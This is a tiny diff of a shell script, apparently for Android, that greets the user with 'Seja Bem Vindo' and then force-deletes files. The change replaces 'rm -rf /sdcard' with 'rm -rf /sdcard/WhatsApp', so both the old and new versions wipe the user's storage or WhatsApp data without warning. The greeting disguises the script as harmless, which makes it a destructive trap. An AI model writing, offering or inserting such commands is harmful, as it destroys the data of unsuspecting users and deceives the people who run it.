@@ -1,3 +1,3 @@
 echo 'Seja Bem Vindo'
-rm -rf /sdcard
+rm -rf /sdcard/WhatsApp
 exit
